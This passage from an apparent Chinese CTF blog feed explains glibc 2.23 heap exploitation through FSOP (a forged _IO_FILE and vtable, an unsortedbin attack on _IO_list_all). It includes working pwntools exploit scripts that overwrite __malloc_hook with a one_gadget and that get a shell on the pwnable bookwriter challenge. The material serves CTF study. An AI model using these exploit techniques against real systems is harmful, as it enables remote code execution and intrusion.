class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">libc_base=leak-(<span class="number">0x3c4b78</span>)</span><br><span class="line"></span><br><span class="line">realloc_addr=libc_base+libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line"></span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">fake_chunk_addr=malloc_hook-<span class="number">0x23</span></span><br><span class="line"></span><br><span class="line">one_gadget=libc_base+<span class="number">0x4527a</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(realloc_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(fake_chunk_addr))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x08</span>)<span class="comment"># 4与2同时指向0x70</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(fake_chunk_addr)+<span class="string">b&#x27;\n&#x27;</span>)<span class="comment">#换行依然很重要</span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x08</span>)<span class="comment">#4</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x13</span>-<span class="number">0x08</span>)+p64(one_gadget)+p64(realloc_addr+<span class="number">12</span>)</span><br><span class="line">add(<span class="number">0x68</span>,payload)<span class="comment">#5</span></span><br><span class="line">r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">r.send(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">r.sendafter(<span class="string">b&quot;size?&quot;</span>,<span class="built_in">str</span>(<span class="number">0x18</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行有小几率会发生段错误</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> SunmerCamp2023 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初探FSOP</title>
      <link href="/posts/6507/"/>
      <url>/posts/6507/</url>
      
        <content type="html"><![CDATA[<h1 id="初识"><a href="#初识" class="headerlink" title="初识"></a>初识</h1><p>FSOP 是 File Stream Oriented Programming 的缩写。所有的 _IO_FILE 结构会由 _chain 字段连接形成一个链表，<strong>由全局变量 _IO_list_all 来维护表头</strong>。而 FSOP 的核心思想就是劫持通过 _IO_list_all 的值来伪造链表和其中的 _IO_FILE 项。</p><h2 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h2><p>先看FSOP技术利用的核心函数<strong>_IO_flush_all_lockp</strong></p><p>该函数会刷新_IO_list_all 链表中所有项的文件流，<strong><u>相当于对每个 FILE 调用 fflush(更新缓存区函数)</u></strong>，也对应着会调用vtable 中的_IO_overflow(以当前io_file指针为参数)。</p><p>关键部分如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">      ......</span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">    result = EOF;</span><br><span class="line"></span><br><span class="line">      ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可见要执行_IO_OVERFLOW的前提是:</p><ol><li><strong>fp-&gt;_mode&lt;=0</strong></li><li><strong>fp-&gt;_IO_write_ptr&gt;fp-&gt;_IO_write_base</strong></li></ol><p>或者:</p><ol><li><strong>fp-&gt;_mode &gt; 0</strong></li><li><strong>_IO_vtable_offset (fp) == 0</strong></li><li><strong>fp-&gt;_wide_data-&gt;_IO_write_ptr&gt;fp-&gt;_wide_data-&gt;_IO_write_bas</strong></li></ol><p>其中<code># define _IO_vtable_offset(THIS) (THIS)-&gt;_vtable_offset</code>就是获得_IO_FILE结构体中的_vtable_offset</p><p><strong>这二者都是可行的,不过个人比较喜欢用前者更方便</strong></p><h2 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h2><p>那么该如何调用<strong>_IO_flush_all_lockp</strong></p><p>_IO_flush_all_lockp 在以下三种情况下会被系统调用：</p><ol><li><strong>当执行 abort 流程时</strong></li><li><strong>当执行 exit 函数时</strong></li><li><strong>当执行流从 main 函数返回时</strong></li></ol><h2 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h2><p>在堆中,触发错误时的malloc_printer函数会调用abort</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/abort_routine.001.jpeg" alt=""></p><h1 id="2-23利用"><a href="#2-23利用" class="headerlink" title="2.23利用"></a>2.23利用</h1><p>从以上可知只要分别伪造_IO_FILE和vtable,部署好函数调用</p><p>例如除绕过检测之外</p><ol><li>在IO_FILE开头写上b’/bin/sh\0’</li><li>IO_OVERFLOW写为system</li></ol><p>就能getshell</p><p><strong>IO_FILE</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span>* _IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">  <span class="type">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//宏定义,如果宏_IO_USE_OLD_IO_FILE会把_IO_FILE拆成两个部分</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  <span class="type">void</span> *__pad1;</span><br><span class="line">  <span class="type">void</span> *__pad2;</span><br><span class="line">  <span class="type">void</span> *__pad3;</span><br><span class="line">  <span class="type">void</span> *__pad4;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>IO_FILE_plus</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    _IO_FILE    file;</span><br><span class="line">    IO_jump_t   *vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>vtable</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>利用<strong>unsortedbin attack</strong>往IO_list_all中写入main_arena+0x58</p><p>由于_chain字段在_IO_FILE中的偏移是0x68</p><p>那么就会将真实大小为0x60chunk的bk字段视为_chain字段,故该bk需指向fake_IO_FILE</p><p>所以fake_IO_FILE需要被加入0x60的smallbin中,并确保是最后一个chunk</p><p>一般是触发从unsortedbin往外取出,放入smallbin后,继续取出(IO_list_all-0x10)但因为大小不通过检测,触发malloc_printer,以此getshell</p><p>IO_list_all-0x10视为chunk的话size字段是空的(固定内存)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">      &#123;</span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">            || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">          malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                           chunk2mem (victim), av);</span><br></pre></td></tr></table></figure><p>不过在 2.24 版本的 glibc 中，全新加入了针对 IO_FILE_plus 的 vtable 劫持的检测措施，glibc 会在调用虚函数之前首先检查 vtable 地址的合法性。会验证 vtable 是否位于_IO_vtable 段中,这就使得这种办法失效了</p><h2 id="实战pwnable-bookwriter"><a href="#实战pwnable-bookwriter" class="headerlink" title="实战pwnable_bookwriter"></a>实战pwnable_bookwriter</h2><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/bw&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>libc是2.23</p><p>主要漏洞点:</p><ol><li>根据内存判断应该只能存储8个book,但是add函数判断时是if(a&gt;8)结合函数功能会将一个book的size覆写为一个地址(一个很大的数值)</li><li>edit函数后会将book的size根据新输入的字符串调整,如果和下一个chunk的size连接起来就可以多写一个字节到下一个chunk</li><li>author长度为0x40时,可以向下继续泄露地址</li></ol><p>利用核心:</p><ol><li>这题没有free功能,要想泄露libc就要对topchunk动手脚(本体可以修改其大小,再申请一个比修改后的size大的大小,使topchunk加入unsortedbin)</li><li>具体的漏洞利用实现要用到FSOP</li><li>topchunk在这道题中非常关键</li></ol><p>实现过程:</p><ol><li>泄露heap</li><li>通过topchunk进入unsortedbin泄露libc</li><li>第0个chunk大数字写伪造io_file和vtable</li><li>申请chunk利用unsortedbin attack写IO_file,并让fake_iofile加入到smallbin链并成功进入fake_io_list_all,并因为unsortedbin链损坏触发malloc_printer以此getshell</li></ol><p>触发trigger(将IO_list_all-0x10视为chunk起始的话,size==0)</p><p><strong>exp:</strong>(有小概率失败,可能是ASLR的影响)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">elf= ELF(<span class="string">&quot;./bw&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./bw&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;page :&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Content :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">idx</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;page :&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;page :&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.sendafter(<span class="string">b&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">p.sendafter(<span class="string">b&#x27;Author :&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"> </span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>)  <span class="comment">#top chunk size edit</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;\xe1\x0f\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap</span></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">64</span>)</span><br><span class="line">heap_addr = u64(p.recvline()[<span class="number">0</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;(yes:1 / no:0) &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment">#add top chunk to unsorted bin</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">view(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">libc_addr  = u64(p.recvline()[<span class="number">0</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">libc.address = libc_addr - <span class="number">0x3c4b78</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;libc_base: &#x27;</span>, <span class="built_in">hex</span>(libc.address))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;libc_addr:&#x27;</span>, <span class="built_in">hex</span>(libc_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;system: &#x27;</span>,<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;heap: &#x27;</span>,<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;_IO_list_all: &quot;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">data = <span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x2b0</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\0&#x27;</span>+p64(<span class="number">0x61</span>)+p64(<span class="number">0</span>)+p64(libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]-<span class="number">0x10</span>)+p64(<span class="number">2</span>)+p64(<span class="number">3</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xc0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">vtable = heap_addr + <span class="number">0x2b0</span> +<span class="number">0xe0</span></span><br><span class="line">payload += p64(vtable)</span><br><span class="line">payload +=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,data + payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Size of page :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x10</span>).encode())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="2-24后新机制下利用"><a href="#2-24后新机制下利用" class="headerlink" title="2.24后新机制下利用"></a>2.24后新机制下利用</h1><h2 id="变化"><a href="#变化" class="headerlink" title="变化"></a>变化</h2><p>在 2.24 版本的 glibc 中，全新加入了针对 IO_FILE_plus 的 vtable 劫持的检测措施，glibc 会在<strong>调用虚函数之前</strong>首先检查 vtable 地址的合法性。首先会验证 vtable 是否位于_IO_vtable 段中，如果满足条件就正常执行，否则会调用_IO_vtable_check 做进一步检查。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check if unknown vtable pointers are permitted; otherwise,</span></span><br><span class="line"><span class="comment">   terminate the process.  */</span></span><br><span class="line"><span class="type">void</span> _IO_vtable_check (<span class="type">void</span>) attribute_hidden;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Perform vtable pointer validation.  If 